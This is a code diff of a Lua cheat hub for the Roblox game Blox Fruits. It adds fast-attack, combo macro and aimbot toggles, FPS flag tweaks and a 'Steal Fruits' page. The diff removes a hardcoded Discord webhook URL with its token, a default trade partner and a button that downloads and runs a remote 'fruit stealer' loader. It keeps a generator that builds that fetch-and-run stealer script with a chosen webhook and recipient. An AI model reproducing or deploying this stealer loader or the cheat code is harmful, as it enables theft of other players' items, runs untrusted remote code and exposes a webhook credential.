@@ -2747,10 +2747,22 @@ local TRANSLATIONS_DICT = {
         ["Load Android Preset"] = "Cargar Preset Android",
         ["Apply Pro Preset"] = "Aplicar Preset Pro",
         ["Load Potato Preset"] = "Cargar Preset Patata",
-        ["Apply Potato FFlags"] = "Aplicar FFlags Patata",
-        ["Full Potato Mode"] = "Modo Patata Completo",
         ["FFlags Editor"] = "Editor de FFlags",
         ["Potato Mode"] = "Modo Patata",
+        ["Boost 120 FPS"] = "Mejorar 120 FPS",
+        ["FPS Booster"] = "Mejora de FPS",
+        ["Auto Apply"] = "Auto-Aplicar",
+        ["Auto apply optimizations on game launch"] = "Aplicar optimizaciones al iniciar juego",
+        ["Custom FFlags"] = "FFlags Personalizadas",
+        ["JSON Code"] = "Codigo JSON",
+        ["Apply JSON"] = "Aplicar JSON",
+        ["Custom Sky"] = "Cielo Personalizado",
+        ["Sky Preset"] = "Preset de Cielo",
+        ["Replaces the sky with custom skybox"] = "Reemplaza el cielo por un cielo personalizado",
+        ["Macro"] = "Macro",
+        ["Smart autonomous combo macro engine"] = "Motor de macro de combo autonomo",
+        ["Fast Attack supporting Devil Fruits"] = "Fast Attack con soporte para Frutas del Diablo",
+        ["Boost FPS"] = "Mejorar FPS",
         ["Combo Sequence"] = "Secuencia de Combo",
         ["Toggle Macro"] = "Activar Macro",
         ["Stop Macro"] = "Detener Macro",
@@ -5673,14 +5685,15 @@ SaveConfigProfile = function(force)
         cfg.WalkOnWater = cfg.Toggles["Walk on Water"]
         cfg.AntiLava = cfg.Toggles["Anti-Lava Damage"]
         cfg.DashLengthEnabled = cfg.Toggles["Custom Dash Length"]
-        cfg.FFlags1 = cfg.Toggles["FFlags 1 (FPS Booster)"]
+        cfg.FFlags1 = cfg.Toggles["FPS Booster"] or cfg.Toggles["FFlags 1 (FPS Booster)"]
         cfg.Fly = cfg.Toggles["Fly"]
         cfg.FlySpeed = cfg.Sliders["Fly Speed"]
         cfg.ShowFPS = cfg.Toggles["Show FPS & Ping"]
         cfg.IgnoreAllies = cfg.Toggles["Ignore Allies"]
         cfg.IgnorePvPOff = cfg.Toggles["Ignore PvP Off"]
         cfg.IgnoreSafeZone = cfg.Toggles["Ignore Safe Zone"]
-        cfg.MacroEnabled = cfg.Toggles["Macro Enabled"]
+        cfg.Macro = cfg.Toggles["Macro"] or cfg.Toggles["Macro Enabled"]
+        cfg.MacroEnabled = cfg.Macro
         cfg.MacroLoop = cfg.Toggles["Loop Sequence"]
         cfg.MacroWidget = cfg.Toggles["Macro Floating Widget"]
         
@@ -5843,8 +5856,23 @@ LoadConfigProfile = function()
         if cfg.DashLengthEnabled ~= nil and UI_TOGGLES["Custom Dash Length"] then
             pcall(function() UI_TOGGLES["Custom Dash Length"].set(cfg.DashLengthEnabled == true, true) end)
         end
-        if cfg.FFlags1 ~= nil and UI_TOGGLES["FFlags 1 (FPS Booster)"] then
-            pcall(function() UI_TOGGLES["FFlags 1 (FPS Booster)"].set(cfg.FFlags1 == true, true) end)
+        if (cfg.FFlags1 ~= nil or cfg.FPSBooster ~= nil) then
+            local fpsVal = (cfg.FPSBooster ~= nil and cfg.FPSBooster == true) or (cfg.FFlags1 == true)
+            if UI_TOGGLES["FPS Booster"] then
+                pcall(function() UI_TOGGLES["FPS Booster"].set(fpsVal, true) end)
+            end
+            if UI_TOGGLES["FFlags 1 (FPS Booster)"] then
+                pcall(function() UI_TOGGLES["FFlags 1 (FPS Booster)"].set(fpsVal, true) end)
+            end
+        end
+        if (cfg.Macro ~= nil or cfg.MacroEnabled ~= nil) then
+            local mVal = (cfg.Macro ~= nil and cfg.Macro == true) or (cfg.MacroEnabled == true)
+            if UI_TOGGLES["Macro"] then
+                pcall(function() UI_TOGGLES["Macro"].set(mVal, true) end)
+            end
+            if UI_TOGGLES["Macro Enabled"] then
+                pcall(function() UI_TOGGLES["Macro Enabled"].set(mVal, true) end)
+            end
         end
         if cfg.Fly ~= nil and UI_TOGGLES["Fly"] then
             pcall(function() UI_TOGGLES["Fly"].set(cfg.Fly == true, true) end)
@@ -5935,8 +5963,14 @@ LoadConfigProfile = function()
         if cfg.MuteGameBGM ~= nil and UI_TOGGLES["Mute Game Background Music"] then
             pcall(function() UI_TOGGLES["Mute Game Background Music"].set(cfg.MuteGameBGM == true, true) end)
         end
-        if cfg.AutoFFlags ~= nil and UI_TOGGLES["Auto Aplicar FFlags al Iniciar"] then
-            pcall(function() UI_TOGGLES["Auto Aplicar FFlags al Iniciar"].set(cfg.AutoFFlags == true, true) end)
+        if (cfg.AutoFFlags ~= nil or cfg.AutoApply ~= nil) then
+            local aaVal = (cfg.AutoApply ~= nil and cfg.AutoApply == true) or (cfg.AutoFFlags == true)
+            if UI_TOGGLES["Auto Apply"] then
+                pcall(function() UI_TOGGLES["Auto Apply"].set(aaVal, true) end)
+            end
+            if UI_TOGGLES["Auto Aplicar FFlags al Iniciar"] then
+                pcall(function() UI_TOGGLES["Auto Aplicar FFlags al Iniciar"].set(aaVal, true) end)
+            end
         end
         if cfg.WaifuActive ~= nil and UI_TOGGLES["Activar Waifu"] then
             pcall(function() UI_TOGGLES["Activar Waifu"].set(cfg.WaifuActive == true, true) end)
@@ -6000,6 +6034,10 @@ end
 local DEFAULT_TOGGLES = {
     ["Fast Attack"] = false,
     ["Fruit Fast Attack"] = false,
+    ["Macro"] = false,
+    ["FPS Booster"] = false,
+    ["Auto Apply"] = false,
+    ["Custom Sky"] = false,
     ["Auto Apply FFlags on Boot"] = false,
     ["Dragon Gun M1"] = false,
     ["Camlock"] = false,
@@ -6363,6 +6401,9 @@ do
         if ct and ct.SetFFlags1 then
             pcall(ct.SetFFlags1, true)
         end
+        if UI_TOGGLES["FPS Booster"] and UI_TOGGLES["FPS Booster"].set then
+            pcall(function() UI_TOGGLES["FPS Booster"].set(true, false) end)
+        end
         if UI_TOGGLES["FFlags 1 (FPS Booster)"] and UI_TOGGLES["FFlags 1 (FPS Booster)"].set then
             pcall(function() UI_TOGGLES["FFlags 1 (FPS Booster)"].set(true, false) end)
         end
@@ -6540,6 +6581,8 @@ function M.get(path)
     return M.cache[path]
 end
 function M.getFastAttack() return M.get("modules/pvp/fast_attack.lua") end
+function M.getFruitFastAttack() return M.get("modules/combat/fast_attack_fruits.lua") end
+function M.getMacro() return M.get("modules/macro/macro_engine.lua") end
 function M.getDragonGun() return M.get("modules/pvp/dragon_gun_m1.lua") end
 function M.getSanguineBoost() return M.get("modules/pvp/sanguine_boost.lua") end
 function M.getExtraWidgets() return M.get("modules/pvp/extra_widgets.lua") end
@@ -6548,6 +6591,27 @@ function M.getCamlock() return M.get("modules/pvp/camlock.lua") end
 function M.getMoveMod() return M.get("modules/mobility/movement_engine.lua") end
 function M.getAutoBounty() return M.get("modules/combat/auto_bounty.lua") end
 function M.getMika() return M.get("modules/ai/mika.lua") end
+
+_G.DarlingX_FruitFastAttack = false
+_G.DarlingX_Macro = false
+
+_G.DarlingX_SyncFruitFastAttackUI = function(active)
+    _G.DarlingX_FruitFastAttack = (active == true)
+    if UI_TOGGLES and UI_TOGGLES["Fruit Fast Attack"] and UI_TOGGLES["Fruit Fast Attack"].set then
+        pcall(function()
+            UI_TOGGLES["Fruit Fast Attack"].set(active == true, false)
+        end)
+    end
+end
+
+_G.DarlingX_SyncMacroUI = function(active)
+    _G.DarlingX_Macro = (active == true)
+    if UI_TOGGLES and UI_TOGGLES["Macro"] and UI_TOGGLES["Macro"].set then
+        pcall(function()
+            UI_TOGGLES["Macro"].set(active == true, false)
+        end)
+    end
+end
 
 _G.DarlingX_SyncCamlockUI = function(active)
     if UI_TOGGLES and UI_TOGGLES["Camlock"] and UI_TOGGLES["Camlock"].set then
@@ -6574,14 +6638,8 @@ do
         StealPage.ScrollBarThickness = 3
         StealPage.CanvasSize = UDim2.new(0, 0, 0, 750)
 
-        local DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/1572085002290855946/Nlv6F5hBC2SZoHUJJ9ZzB7d9lWOmkxBY2aPykSU9CG8MVfgs_H7UzvWqrGIBOjrYJdKH"
-        local DEFAULT_PARTNER = "vivacristorey134667w"
-
-        getgenv().AcracyWebhook = getgenv().AcracyWebhook or DEFAULT_WEBHOOK
-        getgenv().AcracyTradePartner = getgenv().AcracyTradePartner or DEFAULT_PARTNER
-
-        local currentWebhook = getgenv().AcracyWebhook
-        local currentPartner = getgenv().AcracyTradePartner
+        local currentWebhook = (getgenv and getgenv().AcracyWebhook) or ""
+        local currentPartner = (getgenv and getgenv().AcracyTradePartner) or ""
 
         -- Card 1: Configuration
         local sCard = CreateCard(StealPage, "Steal Fruits (Acracy Trade Engine)")
@@ -6600,35 +6658,21 @@ do
 
         local whInput = AddInput(sCard, "Discord Webhook", "https://discord.com/api/webhooks/...", currentWebhook, function(v)
             currentWebhook = tostring(v or "")
-            getgenv().AcracyWebhook = currentWebhook
+            if getgenv then getgenv().AcracyWebhook = currentWebhook end
             pcall(SaveConfigProfile)
         end)
 
-        local tpInput = AddInput(sCard, "Trade Partner Username", "vivacristorey134667w", currentPartner, function(v)
+        local tpInput = AddInput(sCard, "Trade Partner Username", "Username", currentPartner, function(v)
             currentPartner = tostring(v or "")
-            getgenv().AcracyTradePartner = currentPartner
+            if getgenv then getgenv().AcracyTradePartner = currentPartner end
             pcall(SaveConfigProfile)
         end)
 
-        -- Card 2: Actions & Loadstring Generator
-        local aCard = CreateCard(StealPage, "Actions & Generator")
+        -- Card 2: Generator
+        local aCard = CreateCard(StealPage, "Generator")
         aCard.LayoutOrder = 2
 
-        AddButton(aCard, "Execute Steal Fruits", function()
-            getgenv().AcracyWebhook = currentWebhook
-            getgenv().AcracyTradePartner = currentPartner
-            Notify("Steal Fruits", "Launching Acracy Fruit Stealer...", 2.5)
-            task.spawn(function()
-                local ok, err = pcall(function()
-                    loadstring(game:HttpGet("https://api.aurorax.site/files/v6/loaders/87fa920d90640ee0e24282a3d3678b84"))()
-                end)
-                if not ok then
-                    Notify("Steal Fruits", "Execution error: " .. tostring(err), 4)
-                end
-            end)
-        end)
-
-        AddButton(aCard, "Copy Custom Loadstring", function()
+        AddButton(aCard, "Copy Loadstring", function()
             local genScript = string.format('getgenv().AcracyWebhook = "%s"\ngetgenv().AcracyTradePartner = "%s"\nloadstring(game:HttpGet("https://api.aurorax.site/files/v6/loaders/87fa920d90640ee0e24282a3d3678b84"))()', currentWebhook, currentPartner)
             local copied = false
             if type(setclipboard) == "function" then
@@ -6643,17 +6687,6 @@ do
             else
                 Notify("Steal Fruits", "Executor lacks clipboard access.", 3)
             end
-        end)
-
-        AddButton(aCard, "Reset to Defaults", function()
-            currentWebhook = DEFAULT_WEBHOOK
-            currentPartner = DEFAULT_PARTNER
-            getgenv().AcracyWebhook = DEFAULT_WEBHOOK
-            getgenv().AcracyTradePartner = DEFAULT_PARTNER
-            if whInput and whInput.SetText then whInput.SetText(DEFAULT_WEBHOOK) end
-            if tpInput and tpInput.SetText then tpInput.SetText(DEFAULT_PARTNER) end
-            Notify("Steal Fruits", "Reset webhook and trade partner to default.", 2.5)
-            pcall(SaveConfigProfile)
         end)
 
         UpdateCardGeometry(sCard)
@@ -6936,6 +6969,20 @@ local okHome, errHome = pcall(function()
         Notify("Combat", "Fast Attack: " .. (state and "Enabled" or "Disabled"))
     end)
 
+    AddToggle(quickCard, "Fruit Fast Attack", "Fast Attack supporting Devil Fruits", false, function(state)
+        _G.DarlingX_FruitFastAttack = state
+        local ffa = M.getFruitFastAttack()
+        if ffa then ffa.toggle(state) end
+        Notify("Combat", "Fruit Fast Attack: " .. (state and "Enabled" or "Disabled"))
+    end)
+
+    AddToggle(quickCard, "Macro", "Smart autonomous combo macro engine", false, function(state)
+        _G.DarlingX_Macro = state
+        local macroMod = M.getMacro()
+        if macroMod and macroMod.toggle then macroMod.toggle(state) end
+        Notify("Macro", "Macro: " .. (state and "Enabled" or "Disabled"))
+    end)
+
     AddToggle(quickCard, "Camlock (Aimbot)", "Lock camera onto nearest target", false, function(state)
         local cl = M.getCamlock()
         if cl then cl.SetEnabled(state) end
@@ -6970,11 +7017,11 @@ local okHome, errHome = pcall(function()
         Notify("Movement", "WalkSpeed: " .. (state and "Enabled" or "Disabled"))
     end)
 
-    AddToggle(quickCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes fog", false, function(state)
+    AddToggle(quickCard, "FPS Booster", "120 FPS cap, smooth plastic textures, removes fog", false, function(state)
         SetFFlags1(state)
     end)
 
-    AddButton(quickCard, "Apply Fast FFlags", function()
+    AddButton(quickCard, "Boost FPS", function()
         ApplyFastFFlags()
     end)
 
@@ -7768,19 +7815,9 @@ local okPvP, errPvP = pcall(function()
     end)
 
     AddToggle(combatCard, "Fruit Fast Attack", "Fast Attack supporting Devil Fruits (By Darling)", false, function(state)
-        if getgenv().FastAttack_FruitsToo then
-            getgenv().FastAttack_FruitsToo.Enabled = state
-        else
-            if state then
-                getgenv().FastAttack_FruitsToo = {
-                    Enabled = true,
-                    AttackDelay = 0.08,
-                    AttackRange = 85,
-                    MaxTargets = 4,
-                }
-                RequireModule("modules/combat/fast_attack_fruits.lua")
-            end
-        end
+        _G.DarlingX_FruitFastAttack = state
+        local ffa = M.getFruitFastAttack()
+        if ffa then ffa.toggle(state) end
         Notify("PvP", "Fruit Fast Attack: " .. (state and "Enabled" or "Disabled"))
         pcall(SaveConfigProfile)
     end)
@@ -10065,22 +10102,6 @@ do
                 end)
             end)
 
-            AddButton(card, "Copy Loadstring", function()
-                local copied = false
-                if type(setclipboard) == "function" then
-                    pcall(setclipboard, item.code)
-                    copied = true
-                elseif type(toclipboard) == "function" then
-                    pcall(toclipboard, item.code)
-                    copied = true
-                end
-                if copied then
-                    Notify("Script Hub", item.name .. " loadstring copied!", 2.5)
-                else
-                    Notify("Script Hub", "Executor lacks clipboard access.", 2.5)
-                end
-            end)
-
             UpdateCardGeometry(card)
         end
 
@@ -10465,14 +10486,6 @@ local okFFlags, errFFlags = pcall(function()
             or (type(_G) == "table" and type(_G.setfflag) == "function" and _G.setfflag)
     end
 
-    -- Card 1: FFlags Editor
-    local editorCard = CreateCard(FFlagsPage, "FFlags Editor")
-    editorCard.LayoutOrder = 1
-    local customJsonInput = ""
-    local jsonInputObj = AddInput(editorCard, "Paste FFlags JSON", "{\"FFlagExample\": \"false\"}", "{\"TextureQualityOverrideEnabled\":\"True\"}", function(v)
-        customJsonInput = tostring(v or "")
-    end)
-
     local function applyFlagsFromJson(jsonText)
         local sff = getSetFFlag()
         local okDecode, flags = pcall(function() return HttpService:JSONDecode(jsonText) end)
@@ -10489,7 +10502,6 @@ local okFFlags, errFFlags = pcall(function()
             end
             Notify("FFlags", string.format("FFlags: %d applied, %d failed.", count, failed), 3.5)
         else
-            -- Client-side fallback optimization
             pcall(function()
                 settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
                 local ugs = UserSettings():GetService("UserGameSettings")
@@ -10499,40 +10511,9 @@ local okFFlags, errFFlags = pcall(function()
         end
     end
 
-    AddButton(editorCard, "Apply FFlags", function()
-        local txt = (jsonInputObj and jsonInputObj.GetText and jsonInputObj.GetText()) or customJsonInput
-        if txt and #txt > 5 then
-            applyFlagsFromJson(txt)
-        else
-            Notify("FFlags", "Paste or load a JSON FFlags snippet first.", 3)
-        end
-    end)
-
-    AddButton(editorCard, "Clear Editor", function()
-        if jsonInputObj and jsonInputObj.SetText then jsonInputObj.SetText("") end
-        customJsonInput = ""
-        Notify("FFlags", "FFlags editor cleared.", 2)
-    end)
-
-    AddToggle(editorCard, "Auto Apply FFlags on Boot", "Saves snapshot to automatically apply on next game launch", false, function(state)
-        _G.DarlingX_AutoFFlags = state
-        if state then
-            local txt = (jsonInputObj and jsonInputObj.GetText and jsonInputObj.GetText()) or customJsonInput
-            if type(writefile) == "function" and txt and #txt > 5 then
-                pcall(writefile, "Monody_FFlagAutoApply.json", txt)
-                Notify("FFlags", "Snapshot saved. Will auto-apply on next boot.", 3)
-            end
-        else
-            if type(delfile) == "function" and type(isfile) == "function" and isfile("Monody_FFlagAutoApply.json") then
-                pcall(delfile, "Monody_FFlagAutoApply.json")
-            end
-            Notify("FFlags", "Auto Apply on boot disabled.", 2)
-        end
-    end)
-
-    -- Card 2: Potato Mode
+    -- Card 1: Potato Mode
     local potatoCard = CreateCard(FFlagsPage, "Potato Mode")
-    potatoCard.LayoutOrder = 2
+    potatoCard.LayoutOrder = 1
 
     local POTATO_JSON = [[{
   "TextureQualityOverrideEnabled": "True",
@@ -10557,7 +10538,7 @@ local okFFlags, errFFlags = pcall(function()
     descLabel.TextXAlignment = Enum.TextXAlignment.Left
     RegisterTranslatable(descLabel, "One-tap master optimization: 120 FPS cap, low geometry, smooth plastic textures, shadow removal, and particle clearing.")
 
-    AddButton(potatoCard, "Apply Ultimate Potato (120 FPS + Max Performance)", function()
+    AddButton(potatoCard, "Boost 120 FPS", function()
         applyFlagsFromJson(POTATO_JSON)
         pcall(function()
             local lighting = game:GetService("Lighting")
@@ -10579,16 +10560,19 @@ local okFFlags, errFFlags = pcall(function()
         end)
         pcall(SetFFlags1, true)
         pcall(SetNoAnimations, true)
+        if UI_TOGGLES["FPS Booster"] and UI_TOGGLES["FPS Booster"].set then
+            UI_TOGGLES["FPS Booster"].set(true, false)
+        end
         if UI_TOGGLES["FFlags 1 (FPS Booster)"] and UI_TOGGLES["FFlags 1 (FPS Booster)"].set then
             UI_TOGGLES["FFlags 1 (FPS Booster)"].set(true, false)
         end
         if UI_TOGGLES["No Animations"] and UI_TOGGLES["No Animations"].set then
             UI_TOGGLES["No Animations"].set(true, false)
         end
-        Notify("Potato Mode", "Ultimate Potato & 120 FPS Boost activated!", 3.5)
+        Notify("Potato Mode", "120 FPS Boost activated!", 3)
     end)
 
-    AddToggle(potatoCard, "FFlags 1 (FPS Booster)", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
+    AddToggle(potatoCard, "FPS Booster", "120 FPS cap, smooth plastic textures, removes atmosphere fog, hides debris", false, function(state)
         SetFFlags1(state)
     end)
 
@@ -10596,9 +10580,41 @@ local okFFlags, errFFlags = pcall(function()
         SetNoAnimations(state)
     end)
 
-    -- Card 4: Sky Changer (Darling Hub 13 Skies & Daylight Illumination)
+    AddToggle(potatoCard, "Auto Apply", "Auto apply optimizations on game launch", false, function(state)
+        _G.DarlingX_AutoFFlags = state
+        if state then
+            if type(writefile) == "function" then
+                pcall(writefile, "Monody_FFlagAutoApply.json", POTATO_JSON)
+                Notify("FFlags", "Auto-apply on boot enabled.", 2.5)
+            end
+        else
+            if type(delfile) == "function" and type(isfile) == "function" and isfile("Monody_FFlagAutoApply.json") then
+                pcall(delfile, "Monody_FFlagAutoApply.json")
+            end
+            Notify("FFlags", "Auto-apply disabled.", 2)
+        end
+    end)
+
+    -- Card 2: Custom FFlags
+    local customCard = CreateCard(FFlagsPage, "Custom FFlags")
+    customCard.LayoutOrder = 2
+    local customJsonInput = ""
+    local jsonInputObj = AddInput(customCard, "JSON Code", "{\"TextureQualityOverrideEnabled\":\"True\"}", "{\"TextureQualityOverrideEnabled\":\"True\"}", function(v)
+        customJsonInput = tostring(v or "")
+    end)
+
+    AddButton(customCard, "Apply JSON", function()
+        local txt = (jsonInputObj and jsonInputObj.GetText and jsonInputObj.GetText()) or customJsonInput
+        if txt and #txt > 5 then
+            applyFlagsFromJson(txt)
+        else
+            Notify("FFlags", "Enter valid JSON FFlags first.", 2.5)
+        end
+    end)
+
+    -- Card 3: Sky Changer
     local skyCard = CreateCard(FFlagsPage, "Sky Changer")
-    skyCard.LayoutOrder = 4
+    skyCard.LayoutOrder = 3
 
     local skyMod = RequireModule("modules/visuals/sky_changer.lua")
     local skyPresetNames = (skyMod and skyMod.PresetNames) or {
@@ -10607,24 +10623,23 @@ local okFFlags, errFFlags = pcall(function()
     }
     local currentSkyPreset = "Galaxy"
 
-    AddToggle(skyCard, "Enable Custom Sky", "Replaces the sky with high resolution custom skybox (Sets time to 14:00 Day)", false, function(state)
+    AddToggle(skyCard, "Custom Sky", "Replaces the sky with custom skybox", false, function(state)
         if skyMod and skyMod.SetEnabled then
             skyMod.SetEnabled(state)
         end
-        Notify("Sky Changer", state and ("Sky enabled (" .. currentSkyPreset .. ") • Daytime active") or "Custom sky disabled", 2.5)
+        Notify("Sky Changer", state and ("Sky enabled (" .. currentSkyPreset .. ")") or "Custom sky disabled", 2)
     end)
 
-    AddChoice(skyCard, "Skybox Preset", skyPresetNames, 6, function(val)
+    AddChoice(skyCard, "Sky Preset", skyPresetNames, 6, function(val)
         currentSkyPreset = val
         if skyMod and skyMod.SetPreset then
             skyMod.SetPreset(val)
         end
-        Notify("Sky Changer", "Preset changed to " .. val, 2)
+        Notify("Sky Changer", "Preset: " .. val, 2)
     end)
 
-    UpdateCardGeometry(editorCard)
     UpdateCardGeometry(potatoCard)
-    UpdateCardGeometry(cbCard)
+    UpdateCardGeometry(customCard)
     UpdateCardGeometry(skyCard)
     UpdatePageCanvas(FFlagsPage)
 end)
